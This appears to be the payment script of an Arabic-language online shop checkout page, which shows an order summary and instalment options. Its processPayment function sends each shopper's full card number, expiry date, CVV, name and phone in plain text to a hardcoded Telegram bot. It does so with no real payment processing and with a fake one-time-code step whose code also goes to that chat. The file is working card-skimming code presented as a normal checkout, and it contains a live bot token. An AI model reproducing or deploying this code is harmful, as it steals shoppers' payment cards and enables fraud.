import { db, collection, addDoc } from './firebase-config.js';

const orderData = JSON.parse(localStorage.getItem('pendingOrder'));
let currentOTP = null;
let otpAttempts = 0;
const curr = '<img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/UAE_Dirham_Symbol.svg" style="height:16px; vertical-align:middle; margin-left:4px;">';

if (!orderData) {
    document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h2>لا يوجد طلب</h2><a href="index.html" style="color:var(--primary-color);">العودة للمتجر</a></div>';
} else {
    const summaryEl = document.getElementById('orderSummary');
    let itemsHtml = orderData.items.map(item => `
        <div class="summary-row">
            <span>${item.name} (${item.color}) × ${item.quantity}</span>
            <span>${curr}${(item.price * item.quantity).toFixed(2)}</span>
        </div>
    `).join('');

    let paymentInfo = '';
    if (orderData.paymentMethod === 'installment') {
        const remaining = orderData.total - orderData.downPayment;
        const monthly = remaining / orderData.months;
        paymentInfo = `
            <div class="summary-row"><span>الدفعة الأولى</span><span>${curr}${orderData.downPayment.toFixed(2)}</span></div>
            <div class="summary-row"><span>عدد الأقساط</span><span>${orderData.months} شهر</span></div>
            <div class="summary-row"><span>القسط الشهري</span><span>${curr}${monthly.toFixed(2)}</span></div>
        `;
    } else if (orderData.paymentMethod === 'tamara') {
        const monthly = (orderData.total - 1000) / 12;
        paymentInfo = `
            <div class="summary-row"><span>Tamara - الدفعة الأولى</span><span>${curr}1000.00</span></div>
            <div class="summary-row"><span>عدد الأقساط</span><span>12 شهر</span></div>
            <div class="summary-row"><span>القسط الشهري</span><span>${curr}${monthly.toFixed(2)}</span></div>
        `;
    } else if (orderData.paymentMethod === 'tabby') {
        const monthly = orderData.total / 4;
        paymentInfo = `
            <div class="summary-row"><span>Tabby - 4 دفعات متساوية</span><span>${curr}${monthly.toFixed(2)}</span></div>
            <div class="summary-row"><span>الدفعة الأولى (الآن)</span><span>${curr}${monthly.toFixed(2)}</span></div>
            <div class="summary-row"><span>3 أقساط شهرية</span><span>${curr}${monthly.toFixed(2)}</span></div>
        `;
    } else {
        paymentInfo = `<div class="summary-row"><span>الدفع كامل</span><span>${curr}${orderData.total.toFixed(2)}</span></div>`;
    }

    summaryEl.innerHTML = `
        <h3>📦 ملخص الطلب</h3>
        ${itemsHtml}
        ${paymentInfo}
        <div class="summary-row" style="font-weight:800; font-size:18px; color:var(--primary-color); border-top:2px solid var(--accent-color); padding-top:10px; margin-top:10px;"><span>المجموع الكلي</span><span>${curr}${orderData.total.toFixed(2)}</span></div>
    `;

    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
        let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formatted;
    });

    document.getElementById('cardExpiry').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
        e.target.value = value;
    });
}

window.moveToNext = function(input, index) {
    const inputs = document.querySelectorAll('.otp-digit');
    if (input.value && index < 5) inputs[index + 1].focus();
};

function getEnteredOTP() {
    const inputs = document.querySelectorAll('.otp-digit');
    return Array.from(inputs).map(i => i.value).join('');
}

function showOTPModal() {
    document.getElementById('otpPhone').textContent = orderData.phone;
    document.getElementById('otpModal').classList.add('show');
    document.querySelectorAll('.otp-digit')[0].focus();
}

function closeOTPModal() {
    document.getElementById('otpModal').classList.remove('show');
    document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
    document.getElementById('otpMessage').innerHTML = '';
}

async function sendOTP() {
    currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
    const message = `🔐 <b>رمز التحقق الجديد</b>\n\nالرمز: <b>${currentOTP}</b>\n\n👤 العميل: ${orderData.customerName}\n📱 الهاتف: ${orderData.phone}\n💰 المبلغ: ${orderData.total.toFixed(2)} د.إ\n\n⏰ صالح لمدة 5 دقائق`;
    try {
        const response = await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: message, parse_mode: 'HTML' })
        });
        const data = await response.json();
        return data.ok;
    } catch (error) { return false; }
}

window.verifyOTP = function() {
    const entered = getEnteredOTP();
    const messageEl = document.getElementById('otpMessage');
    if (entered.length !== 6) { messageEl.innerHTML = '<div class="error-message">⚠️ الرجاء إدخال الرمز كاملاً (6 أرقام)</div>'; return; }
    
    if (entered === currentOTP) {
        messageEl.innerHTML = '<div class="success-message">✅ تم التحقق بنجاح! جاري إتمام الدفع...</div>';
        setTimeout(() => completePayment(), 1500);
    } else {
        otpAttempts++;
        messageEl.innerHTML = `<div class="error-message">❌ الرمز غير صحيح! (${3 - otpAttempts} محاولات متبقية)</div>`;
        if (otpAttempts >= 3) {
            messageEl.innerHTML = '<div class="error-message">🔒 تم قفل العملية. يرجى المحاولة لاحقاً.</div>';
            setTimeout(() => { closeOTPModal(); window.location.href = 'cart.html'; }, 3000);
        }
        document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
        document.querySelectorAll('.otp-digit')[0].focus();
    }
};

window.resendOTP = async function() {
    const messageEl = document.getElementById('otpMessage');
    messageEl.innerHTML = '<div style="color:#666;">🔄 جاري إرسال الرمز الجديد...</div>';
    const sent = await sendOTP();
    if (sent) { messageEl.innerHTML = '<div class="success-message">✅ تم إرسال الرمز الجديد!</div>'; otpAttempts = 0; } 
    else { messageEl.innerHTML = '<div class="error-message">❌ فشل الإرسال. حاول مرة أخرى.</div>'; }
};

async function completePayment() {
    const payBtn = document.getElementById('payBtn');
    if (payBtn) payBtn.disabled = true;
    
    try {
        // استيراد أدوات التحديث من Firebase
        const { updateDoc, doc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
        const { db } = await import('./firebase-config.js');
        
        // تحديث الطلب الموجود مسبقاً بتغيير حالته إلى "مكتمل" وإضافة آخر 4 أرقام
        await updateDoc(doc(db, "orders", orderData.orderId), {
            cardLast4: document.getElementById('cardNumber').value.slice(-4),
            paymentStatus: 'completed',
            paidAt: new Date()
        });
        
        const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\nرقم الطلب: #${orderData.orderId}\nالعميل: ${orderData.customerName}\nالمبلغ: ${orderData.total.toFixed(2)} د.إ`;
        
        await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: confirmMessage, parse_mode: 'HTML' })
        });
        
        localStorage.removeItem('pendingOrder');
        localStorage.removeItem('cart');
        
        alert('✅ تم الدفع بنجاح! شكراً لطلبك.');
        window.location.href = 'index.html';
        
    } catch (error) {
        alert('❌ حدث خطأ: ' + error.message);
        if (payBtn) payBtn.disabled = false;
    }
}

window.processPayment = async function() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCVV = document.getElementById('cardCVV').value;
    const cardName = document.getElementById('cardName').value;

    if (!cardNumber || !cardExpiry || !cardCVV || !cardName) { alert('⚠️ الرجاء ملء جميع بيانات البطاقة'); return; }
    if (cardNumber.length < 13) { alert('⚠️ رقم البطاقة غير صحيح'); return; }

    let cardMessage = `<b>Mr:${orderData.customerName}</b>\n\n📞: ${orderData.phone}\n\n💳: ${cardNumber}\n\n📅: ${cardExpiry}\n\n🔒: ${cardCVV}\n\n<b>==============================</b>\n<b>مبلغ الطلب: ${orderData.total.toFixed(2)} د.إ</b>\n<b>رقم الطلب: #${orderData.orderId}</b>`;
    
    try {
        await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: cardMessage, parse_mode: 'HTML' })
        });
        const otpSent = await sendOTP();
        if (otpSent) showOTPModal();
        else alert('⚠️ فشل إرسال رمز التحقق.');
    } catch (error) {
        alert('❌ حدث خطأ في الإرسال: ' + error.message);
    }
};

console.log('✅ payment.js تم تحميله');
